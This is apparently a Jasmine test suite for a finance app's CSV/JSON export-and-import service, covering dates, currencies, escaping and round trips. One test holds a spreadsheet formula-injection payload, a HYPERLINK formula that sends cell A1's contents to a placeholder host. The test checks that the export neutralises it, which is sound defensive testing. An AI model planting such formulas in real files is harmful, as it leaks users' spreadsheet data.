import { TestBed } from '@angular/core/testing';
import { BACKUP_SCHEMA_VERSION, ExportService } from './export.service';
import { CategoryService } from './category.service';
import { CurrencyService } from './currency.service';
import { TranslationService } from './translation.service';
import { FirestoreService } from './firestore.service';
import { AuthService } from './auth.service';
import { MockFirestoreService } from './testing/mock-firestore.service';
import { MockAuthService } from './testing/mock-auth.service';
import { createTransaction, createCategory, createCategoryHierarchy } from './testing/test-data';
import { parseCsvRows } from '../utils/csv.utils';
import { Timestamp } from '@angular/fire/firestore';

class MockTranslationService {
  t(key: string): string {
    // Simulate translation by returning mapped values for known keys
    const translations: Record<string, string> = {
      'categoryNames.food': 'Food & Drinks',
      'categoryNames.restaurants': 'Restaurants',
      'categoryNames.groceries': 'Groceries',
      'categoryNames.transport': 'Transportation',
      'categoryNames.salary': 'Salary'
    };
    return translations[key] ?? key;
  }
}

describe('ExportService', () => {
  let service: ExportService;
  let categoryService: CategoryService;
  let currencyService: CurrencyService;

  beforeEach(() => {
    // The real CurrencyService starts a rates refresh in its constructor; on
    // CI runners the fetch can succeed and write cached rates through the
    // Firestore mock mid-test. Reject it so specs stay deterministic.
    spyOn(window, 'fetch').and.rejectWith(new Error('network disabled in specs'));

    TestBed.configureTestingModule({
      providers: [
        ExportService,
        CategoryService,
        CurrencyService,
        { provide: TranslationService, useClass: MockTranslationService },
        { provide: FirestoreService, useClass: MockFirestoreService },
        { provide: AuthService, useClass: MockAuthService }
      ]
    });

    service = TestBed.inject(ExportService);
    categoryService = TestBed.inject(CategoryService);
    currencyService = TestBed.inject(CurrencyService);

    // Set up test categories
    categoryService.categories.set(createCategoryHierarchy());

    // Set up exchange rates
    currencyService.exchangeRates.set(new Map([
      ['USD', 1],
      ['EUR', 0.92]
    ]));
  });

  describe('exportToCSV', () => {
    it('names every detailed column in the header', async () => {
      const blob = service.exportToCSV([createTransaction()]);

      const headerLine = (await blob.text()).split('\n')[0];

      expect(headerLine.split(',')).toEqual([
        'Date', 'Type', 'Category', 'Description', 'Amount', 'Currency',
        'Amount (Base)', 'Note', 'Tags', 'Location', 'Period', 'Recurring'
      ]);
    });

    it('should include transaction data', (done) => {
      const transaction = createTransaction({
        description: 'Test Transaction',
        amount: 100,
        type: 'expense'
      });
      const blob = service.exportToCSV([transaction]);

      const reader = new FileReader();
      reader.onload = () => {
        const content = reader.result as string;
        expect(content).toContain('Test Transaction');
        expect(content).toContain('100');
        expect(content).toContain('expense');
        done();
      };
      reader.readAsText(blob);
    });

    it('should escape commas in description', (done) => {
      const transaction = createTransaction({
        description: 'Food, Drinks, and More'
      });
      const blob = service.exportToCSV([transaction]);

      const reader = new FileReader();
      reader.onload = () => {
        const content = reader.result as string;
        expect(content).toContain('"Food, Drinks, and More"');
        done();
      };
      reader.readAsText(blob);
    });

    // The Date column is a local calendar day: it must match what the app
    // displays in every zone, not the UTC rendering of the same instant.
    // Each of these is red in one hemisphere only, which is why this file
    // runs under both offsets in CI (test:dates).
    it('writes the calendar day the user picked, not its UTC rendering', async () => {
      const transaction = createTransaction({
        date: Timestamp.fromDate(new Date(2026, 7, 1))
      });

      const content = await service.exportToCSV([transaction]).text();

      expect(content.split('\n')[1].startsWith('2026-08-01,')).toBeTrue();
    });

    it('keeps a late-evening transaction on its local day', async () => {
      const transaction = createTransaction({
        date: Timestamp.fromDate(new Date(2026, 6, 31, 22, 0))
      });

      const content = await service.exportToCSV([transaction]).text();

      expect(content.split('\n')[1].startsWith('2026-07-31,')).toBeTrue();
    });

    it('round-trips its own export to the same local day', async () => {
      const transaction = createTransaction({
        date: Timestamp.fromDate(new Date(2026, 7, 1))
      });

      const blob = service.exportToCSV([transaction]);
      const file = new File([blob], 'roundtrip.csv', { type: 'text/csv' });
      const result = await service.importFromCSV(file);

      expect(result.length).toBe(1);
      expect(result[0].date.getFullYear()).toBe(2026);
      expect(result[0].date.getMonth()).toBe(7);
      expect(result[0].date.getDate()).toBe(1);
    });

    it('emits the location name in its own cell and an empty one without it', async () => {
      // Distinct pinned dates: the export sorts rows date-descending, and two
      // now() fixtures only keep their insertion order when both land in the
      // same millisecond — a coin-flip that made this spec flaky.
      const transactions = [
        createTransaction({
          description: 'With location',
          date: Timestamp.fromDate(new Date(2026, 6, 2)),
          location: { name: 'Aoyama, Market', lat: 35.66, lng: 139.71 },
        }),
        createTransaction({
          description: 'Without location',
          date: Timestamp.fromDate(new Date(2026, 6, 1)),
        }),
      ];
      const blob = service.exportToCSV(transactions);

      // Asserted on the cell, not the end of the line: pinning the tail is
      // what made this break when Period and Recurring were appended.
      const rows = parseCsvRows(await blob.text());
      const locationCol = rows[0].indexOf('Location');

      // Name only — the coordinates stay out of the CSV.
      expect(rows[1][locationCol]).toBe('Aoyama, Market');
      expect(rows[1].join(',')).not.toContain('35.66');
      expect(rows[2][locationCol]).toBe('');
    });

    it('should apply date range filter', () => {
      const now = new Date();
      const oldDate = new Date(now.getFullYear() - 1, 0, 1);
      const recentDate = new Date();

      const transactions = [
        createTransaction({ date: Timestamp.fromDate(oldDate) }),
        createTransaction({ date: Timestamp.fromDate(recentDate) })
      ];

      const startDate = new Date(now.getFullYear(), 0, 1);
      const endDate = new Date();

      const blob = service.exportToCSV(transactions, {
        dateRange: { start: startDate, end: endDate }
      });

      // The blob should only contain the recent transaction
      expect(blob.size).toBeGreaterThan(0);
    });

    it('keeps the summary format at five columns', async () => {
      const blob = service.exportToCSV([createTransaction()], { format: 'summary' });

      const headerLine = (await blob.text()).split('\n')[0];

      // Summary is the at-a-glance format and is lossy on purpose: it already
      // drops description, note, tags and location, so carrying Period would
      // not make it round-trip — it would only cost it its shape.
      expect(headerLine.split(',').length).toBe(5); // Date, Type, Category, Amount, Currency
      expect(headerLine).not.toContain('Period');
      expect(headerLine).not.toContain('Recurring');
    });

    it('should translate category names using translation keys', (done) => {
      // Create a category with a translation key as name
      const categoryWithTranslationKey = createCategory({
        id: 'food_test',
        name: 'categoryNames.food', // Translation key
        type: 'expense'
      });
      categoryService.categories.set([categoryWithTranslationKey]);

      const transaction = createTransaction({
        categoryId: 'food_test'
      });
      const blob = service.exportToCSV([transaction]);

      const reader = new FileReader();
      reader.onload = () => {
        const content = reader.result as string;
        // Should contain translated name, not the translation key
        expect(content).toContain('Food & Drinks');
        expect(content).not.toContain('categoryNames.food');
        done();
      };
      reader.readAsText(blob);
    });

    it('should return Unknown for missing categories', (done) => {
      categoryService.categories.set([]);

      const transaction = createTransaction({
        categoryId: 'non_existent_category'
      });
      const blob = service.exportToCSV([transaction]);

      const reader = new FileReader();
      reader.onload = () => {
        const content = reader.result as string;
        expect(content).toContain('Unknown');
        done();
      };
      reader.readAsText(blob);
    });

    it('should translate category names in summary format', (done) => {
      const categoryWithTranslationKey = createCategory({
        id: 'transport_test',
        name: 'categoryNames.transport',
        type: 'expense'
      });
      categoryService.categories.set([categoryWithTranslationKey]);

      const transaction = createTransaction({
        categoryId: 'transport_test'
      });
      const blob = service.exportToCSV([transaction], { format: 'summary' });

      const reader = new FileReader();
      reader.onload = () => {
        const content = reader.result as string;
        expect(content).toContain('Transportation');
        expect(content).not.toContain('categoryNames.transport');
        done();
      };
      reader.readAsText(blob);
    });

    it('escapes a comma in a category name', async () => {
      categoryService.categories.set([createCategory({
        id: 'food_test',
        name: 'Food, Drinks & More',
        type: 'expense'
      })]);
      const blob = service.exportToCSV([createTransaction({ categoryId: 'food_test' })]);

      const rows = parseCsvRows(await blob.text());

      // The row keeps its column count: an unescaped comma here shifted every
      // later cell, and Location fell off the end.
      expect(rows[1].length).toBe(rows[0].length);
      expect(rows[1][rows[0].indexOf('Category')]).toBe('Food, Drinks & More');
    });

    it('escapes a comma in a tag', async () => {
      const blob = service.exportToCSV([createTransaction({
        tags: ['groceries, bulk', 'reimbursable']
      })]);

      const rows = parseCsvRows(await blob.text());

      expect(rows[1].length).toBe(rows[0].length);
      expect(rows[1][rows[0].indexOf('Tags')]).toBe('groceries, bulk; reimbursable');
    });

    it('keeps a note containing a newline in a single row', async () => {
      const blob = service.exportToCSV([createTransaction({
        note: 'first line\nsecond line'
      })]);

      const rows = parseCsvRows(await blob.text());

      expect(rows.length).toBe(2);
      expect(rows[1][rows[0].indexOf('Note')]).toBe('first line\nsecond line');
    });

    it('guards a description the receipt scanner wrote as a formula', async () => {
      const blob = service.exportToCSV([createTransaction({
        description: '=HYPERLINK("http://x/?d="&A1,"receipt")'
      })]);

      const content = await blob.text();

      // A spreadsheet opening this must see text, not a live formula.
      expect(content).toContain('\'=HYPERLINK');
      expect(content).not.toContain(',=HYPERLINK');
    });

    it('leaves the amount columns numeric so a spreadsheet still sums them', async () => {
      const blob = service.exportToCSV([createTransaction({ amount: 45, amountInBaseCurrency: 45 })]);

      const rows = parseCsvRows(await blob.text());

      expect(rows[1][rows[0].indexOf('Amount')]).toBe('45');
      expect(rows[1][rows[0].indexOf('Amount (Base)')]).toBe('45');
    });

    it('writes the period and recurrence on a row that has them', async () => {
      const transactions = [
        createTransaction({
          date: Timestamp.fromDate(new Date(2026, 6, 2)),
          period: 'monthly',
          isRecurring: true
        }),
        createTransaction({ date: Timestamp.fromDate(new Date(2026, 6, 1)) }),
      ];
      const blob = service.exportToCSV(transactions);

      const rows = parseCsvRows(await blob.text());
      const periodCol = rows[0].indexOf('Period');
      const recurringCol = rows[0].indexOf('Recurring');

      expect(rows[1][periodCol]).toBe('monthly');
      expect(rows[1][recurringCol]).toBe('true');
      expect(rows[2][periodCol]).toBe('');
      expect(rows[2][recurringCol]).toBe('');
    });
  });

  describe('exportToJSON', () => {
    it('should create valid JSON', (done) => {
      const transactions = [createTransaction()];
      const categories = createCategoryHierarchy();

      const blob = service.exportToJSON({
        transactions,
        categories,
        exportDate: new Date().toISOString(),
        version: '1.0'
      });

      const reader = new FileReader();
      reader.onload = () => {
        const content = reader.result as string;
        const parsed = JSON.parse(content);
        expect(parsed.transactions).toBeDefined();
        expect(parsed.categories).toBeDefined();
        // Bumped when insight snapshots joined the backup. The version had
        // never moved as sections were added, so a schema change was shipping
        // under the same number each time.
        expect(parsed.version).toBe(BACKUP_SCHEMA_VERSION);
        // Last bumped when goals joined the backup.
        expect(parsed.version).toBe('1.3');
        done();
      };
      reader.readAsText(blob);
    });

    it('should include export date', (done) => {
      const exportDate = new Date().toISOString();
      const blob = service.exportToJSON({
        transactions: [],
        categories: [],
        exportDate,
        version: '1.0'
      });

      const reader = new FileReader();
      reader.onload = () => {
        const content = reader.result as string;
        const parsed = JSON.parse(content);
        expect(parsed.exportDate).toBeDefined();
        done();
      };
      reader.readAsText(blob);
    });
  });

  describe('CSV parsing (private methods via importFromCSV)', () => {
    // Test parseAmount through the public interface
    it('should parse positive numbers', async () => {
      const csvContent = 'Date,Description,Amount\n2024-01-15,Test,100.50';
      const file = new File([csvContent], 'test.csv', { type: 'text/csv' });

      const result = await service.importFromCSV(file);
      expect(result.length).toBe(1);
      expect(result[0].amount).toBe(100.50);
    });

    it('should parse negative amounts with minus sign', async () => {
      const csvContent = 'Date,Description,Amount\n2024-01-15,Test,-50.00';
      const file = new File([csvContent], 'test.csv', { type: 'text/csv' });

      const result = await service.importFromCSV(file);
      expect(result.length).toBe(1);
      // Service stores absolute value, type indicates direction
      expect(result[0].amount).toBe(50);
      expect(result[0].type).toBe('expense');
    });

    it('should parse negative amounts with parentheses', async () => {
      const csvContent = 'Date,Description,Amount\n2024-01-15,Test,(75.00)';
      const file = new File([csvContent], 'test.csv', { type: 'text/csv' });

      const result = await service.importFromCSV(file);
      expect(result.length).toBe(1);
      // Service stores absolute value, type indicates direction
      expect(result[0].amount).toBe(75);
      expect(result[0].type).toBe('expense');
    });

    // These read a *local* calendar day off the row. They were already correct
    // assertions and already zone-dependent — this one failed under
    // TZ=America/New_York, where `new Date('2024-06-15')` is 14 June — which is
    // why CI runs this file either side of UTC.
    it('should parse YYYY-MM-DD date format', async () => {
      const csvContent = 'Date,Description,Amount\n2024-06-15,Test,100';
      const file = new File([csvContent], 'test.csv', { type: 'text/csv' });

      const result = await service.importFromCSV(file);
      expect(result.length).toBe(1);
      expect(result[0].date.getFullYear()).toBe(2024);
      expect(result[0].date.getMonth()).toBe(5); // June is month 5
      expect(result[0].date.getDate()).toBe(15);
    });

    it('should parse MM/DD/YYYY date format', async () => {
      const csvContent = 'Date,Description,Amount\n06/15/2024,Test,100';
      const file = new File([csvContent], 'test.csv', { type: 'text/csv' });

      const result = await service.importFromCSV(file);
      expect(result.length).toBe(1);
      // Month and day too: this branch is deliberately left to the platform,
      // and asserting only the year would not notice if it stopped being.
      expect(result[0].date.getFullYear()).toBe(2024);
      expect(result[0].date.getMonth()).toBe(5);
      expect(result[0].date.getDate()).toBe(15);
    });

    it('leaves a full ISO instant with its time rather than truncating it', async () => {
      // The date patterns are unanchored, so the YYYY-MM-DD one matches inside
      // this string too. The date-only check has to be anchored or it steals
      // the case and drops the time.
      const csvContent = 'Date,Description,Amount\n2024-06-15T10:30:00Z,Test,100';
      const file = new File([csvContent], 'test.csv', { type: 'text/csv' });

      const result = await service.importFromCSV(file);
      expect(result[0].date.getTime()).toBe(Date.parse('2024-06-15T10:30:00Z'));
    });

    it('should handle quoted values with commas', async () => {
      const csvContent = 'Date,Description,Amount\n2024-01-15,"Food, drinks, etc",100';
      const file = new File([csvContent], 'test.csv', { type: 'text/csv' });

      const result = await service.importFromCSV(file);
      expect(result.length).toBe(1);
      expect(result[0].description).toBe('Food, drinks, etc');
    });

    it('should handle debit/credit columns', async () => {
      const csvContent = 'Date,Description,Debit,Credit\n2024-01-15,Expense,50,\n2024-01-16,Income,,100';
      const file = new File([csvContent], 'test.csv', { type: 'text/csv' });

      const result = await service.importFromCSV(file);
      expect(result.length).toBe(2);
      // Service stores absolute values, type indicates direction
      expect(result[0].amount).toBe(50);
      expect(result[0].type).toBe('expense');
      expect(result[1].amount).toBe(100);
      expect(result[1].type).toBe('income');
    });

    it('should detect transaction type from amount', async () => {
      const csvContent = 'Date,Description,Amount\n2024-01-15,Income,100\n2024-01-16,Expense,-50';
      const file = new File([csvContent], 'test.csv', { type: 'text/csv' });

      const result = await service.importFromCSV(file);
      expect(result[0].type).toBe('income');
      expect(result[1].type).toBe('expense');
    });
  });

  describe('parseImportedData', () => {
    it('should convert raw transactions to DTOs', () => {
      const raw = [
        { description: 'Test', amount: 100, date: new Date(), type: 'expense' as const }
      ];

      const result = service.parseImportedData(raw, 'THB');
      expect(result.length).toBe(1);
      expect(result[0].type).toBe('expense');
      expect(result[0].amount).toBe(100);
      // A bank CSV row carries no currency, so it lands in the account's own
      // rather than a hardcoded USD.
      expect(result[0].currency).toBe('THB');
      expect(result[0].categoryId).toBe('other_expense');
    });

    it('round-trips the details a backup row carries', () => {
      const raw = [{
        description: 'Fruit',
        amount: 12.5,
        date: new Date(2026, 5, 1),
        type: 'expense' as const,
        currency: 'JPY',
        categoryId: 'food_groceries',
        note: 'weekly shop',
        tags: ['groceries', 'reimbursable'],
        location: { name: 'Aoyama Market', lat: 35.66, lng: 139.71 },
        isRecurring: false,
        period: 'monthly' as const,
      }];

      const result = service.parseImportedData(raw, 'USD');

      // Nothing the backup carried is flattened back to a default.
      expect(result[0].currency).toBe('JPY');
      expect(result[0].categoryId).toBe('food_groceries');
      expect(result[0].note).toBe('weekly shop');
      expect(result[0].tags).toEqual(['groceries', 'reimbursable']);
      expect(result[0].location).toEqual({ name: 'Aoyama Market', lat: 35.66, lng: 139.71 });
      expect(result[0].period).toBe('monthly');
    });

    it('should use absolute value for amount', () => {
      const raw = [
        { description: 'Test', amount: -100, date: new Date() }
      ];

      const result = service.parseImportedData(raw, 'USD');
      expect(result[0].amount).toBe(100);
    });

    it('should infer type from amount if not provided', () => {
      const rawPositive = [{ description: 'Income', amount: 100, date: new Date() }];
      const rawNegative = [{ description: 'Expense', amount: -50, date: new Date() }];

      const resultPositive = service.parseImportedData(rawPositive, 'USD');
      const resultNegative = service.parseImportedData(rawNegative, 'USD');

      expect(resultPositive[0].type).toBe('income');
      expect(resultNegative[0].type).toBe('expense');
    });

    it('keeps an unlabelled row out of the account currency only when it has one', () => {
      const raw = [
        { description: 'Bank row', amount: 100, date: new Date() },
        { description: 'Backup row', amount: 100, date: new Date(), currency: 'JPY' }
      ];

      const result = service.parseImportedData(raw, 'THB');

      expect(result[0].currency).toBe('THB');
      expect(result[1].currency).toBe('JPY');
    });
  });

  describe('CSV currency round trip', () => {
    function csvFile(text: string): File {
      return new File([text], 'transactions.csv', { type: 'text/csv' });
    }

    // exportToCSV has always written a Currency column that parseCSV never
    // read, so the app could not re-import its own export: a THB dinner came
    // back as USD at the same numeric amount.
    it('reads the Currency column that exportToCSV writes', async () => {
      const text = 'Date,Type,Category,Amount,Currency\n2026-06-01,expense,Food,1200,THB\n';

      const result = await service.importFromCSV(csvFile(text));

      expect(result[0].currency).toBe('THB');
      expect(service.parseImportedData(result, 'USD')[0].currency).toBe('THB');
    });

    it('falls back to the account currency when the column is absent', async () => {
      const text = 'Date,Description,Amount\n2026-06-01,Coffee,4.50\n';

      const result = await service.importFromCSV(csvFile(text));

      expect(result[0].currency).toBeUndefined();
      expect(service.parseImportedData(result, 'THB')[0].currency).toBe('THB');
    });

    it('ignores a currency value that is not a real code', async () => {
      const text = 'Date,Description,Amount,Currency\n2026-06-01,Coffee,4.50,dollars\n';

      const result = await service.importFromCSV(csvFile(text));

      expect(result[0].currency).toBeUndefined();
      expect(service.parseImportedData(result, 'THB')[0].currency).toBe('THB');
    });
  });

  describe('CSV round trip', () => {
    function csvFile(text: string): File {
      return new File([text], 'transactions.csv', { type: 'text/csv' });
    }

    async function reimport(transactions: Parameters<ExportService['exportToCSV']>[0]) {
      const blob = service.exportToCSV(transactions);
      return service.importFromCSV(csvFile(await blob.text()));
    }

    it('round-trips a description holding a comma, a quote, a newline and a leading equals', async () => {
      const description = '=SUM(A1,A2) "net", after\ndiscount';

      const result = await reimport([createTransaction({ description })]);

      expect(result.length).toBe(1);
      expect(result[0].description).toBe(description);
    });

    it('round-trips a description that begins with an apostrophe', async () => {
      const result = await reimport([createTransaction({ description: "'til payday" })]);

      expect(result[0].description).toBe("'til payday");
    });

    it('reads a file whose rows end with CRLF', async () => {
      const text = 'Date,Description,Amount\r\n2026-06-01,Coffee,4.50\r\n';

      const result = await service.importFromCSV(csvFile(text));

      expect(result.length).toBe(1);
      expect(result[0].description).toBe('Coffee');
    });

    it('reads the Period and Recurring columns that exportToCSV writes', async () => {
      const result = await reimport([createTransaction({
        period: 'monthly',
        isRecurring: true
      })]);

      expect(result[0].period).toBe('monthly');
      expect(result[0].isRecurring).toBeTrue();
      expect(service.parseImportedData(result, 'USD')[0].period).toBe('monthly');
    });

    it('imports a file written before the Period column existed', async () => {
      const text = 'Date,Type,Category,Description,Amount,Currency,Amount (Base),Note,Tags,Location\n'
        + '2026-06-01,expense,Food,Coffee,4.50,USD,4.50,,,\n';

      const result = await service.importFromCSV(csvFile(text));

      expect(result.length).toBe(1);
      expect(result[0].description).toBe('Coffee');
      expect(result[0].period).toBeUndefined();
    });

    it('drops a period value the app does not know', async () => {
      const text = 'Date,Description,Amount,Period\n2026-06-01,Coffee,4.50,quarterly\n';

      const result = await service.importFromCSV(csvFile(text));

      expect(result[0].period).toBeUndefined();
      expect(service.parseImportedData(result, 'USD')[0].period).toBeUndefined();
    });

    it('ignores a Statement Period column a bank CSV carries', async () => {
      // findColumn matches by substring, so a bank's own Period column lands
      // on ours. Validation is what keeps that harmless.
      const text = 'Date,Description,Amount,Statement Period\n2026-06-01,Coffee,4.50,2024-01 to 2024-02\n';

      const result = await service.importFromCSV(csvFile(text));

      expect(result.length).toBe(1);
      expect(result[0].period).toBeUndefined();
    });
  });

  describe('downloadBlob', () => {
    it('should create download link', () => {
      const blob = new Blob(['test'], { type: 'text/plain' });

      // Spy on document methods
      const createElementSpy = spyOn(document, 'createElement').and.callThrough();
      const appendChildSpy = spyOn(document.body, 'appendChild').and.callThrough();
      const removeChildSpy = spyOn(document.body, 'removeChild').and.callThrough();

      service.downloadBlob(blob, 'test.txt');

      expect(createElementSpy).toHaveBeenCalledWith('a');
      expect(appendChildSpy).toHaveBeenCalled();
      expect(removeChildSpy).toHaveBeenCalled();
    });
  });
});
